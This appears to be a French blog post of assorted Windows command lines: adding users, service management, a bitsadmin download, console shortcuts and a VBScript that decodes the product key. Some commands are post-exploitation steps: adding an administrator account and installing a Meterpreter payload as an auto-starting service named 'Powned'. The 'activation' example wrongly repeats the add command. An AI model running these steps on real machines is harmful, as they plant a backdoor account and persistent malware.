---
layout: post
title: "Lignes de commandes Windows diverses"
description: "Lignes de commandes Windows diverses"
category: Windows
tags: [Windows, Shell]
---
{% include JB/setup %}

##Gestion des utilisateurs##

###Ajout d'un utilisateur###

~~~~~~~
net user NewUserName P@ssw0rd! /add
~~~~~~~

###Ajout d'un utilisateur au groupe des administrateurs###

~~~~~~~
net localgroup Administrateurs NewUserName /add
~~~~~~~

###Activation d'un utilisateur###

~~~~~~~
net user NewUserName P@ssw0rd! /add
~~~~~~~

###Désactivation d'un utilisateur###

~~~~~~~
net user sysadmin /active:no
~~~~~~~


##Gestion des services##

~~~~~~~
sc create Powned binPath= "C:\Meterpreter.exe"
sc config Powned start= auto
net start Powned
sc delete Powned
~~~~~~~


##Gestion des fichiers##

~~~~~~~
xcopy Meterpreter.exe c:\
~~~~~~~


## Téléchargement d'un fichier ##

~~~~~~~
bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
~~~~~~~


##Commandes utiles##

| Commande     |  Description                              |
| ------------ | ----------------------------------------- |
| regedit      | Ouvre l'éditeur de registre               |
| services.msc | Ouvre le gestionnaire de services         |
| secpol.msc   | Ouvre les paramètres de sécurités locales |
| inetcpl.cpl  | Editeur d'option internet                 |


##Récupération de la clé de license##

{% highlight Basic %}
Set WshShell = CreateObject("WScript.Shell")
key          = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\"
ProductName  = "Product Name : " & WshShell.RegRead(key & "ProductName") & vbNewLine
ProductId    = "Product Id : "   & WshShell.RegRead(key & "ProductId")   & vbNewLine
ProductKey   = "Install Key : "  & Converted(WshShell.RegRead(key & "DigitalProductId"))

WScript.echo ProductName & ProductId & ProductKey

Function Converted(id)
    Const OFFSET = 52
    i = 28
    Chars = "BCDFGHJKMPQRTVWXY2346789"

    Do
        Cur = 0
        x = 14
        Do
            Cur = Cur * 256
            Cur = id(x + OFFSET) + Cur
            id(x + OFFSET) = (Cur \ 24) And 255
            Cur = Cur Mod 24
            x = x -1
        Loop While x >= 0

        i = i - 1
        Converted = Mid(Chars, Cur + 1, 1) & Converted

        If (((29 - i) Mod 6) = 0) And (i <> -1) Then
            i = i -1
            Converted = "-" & Converted
        End If
    Loop While i >= 0
End Function
{% endhighlight %}

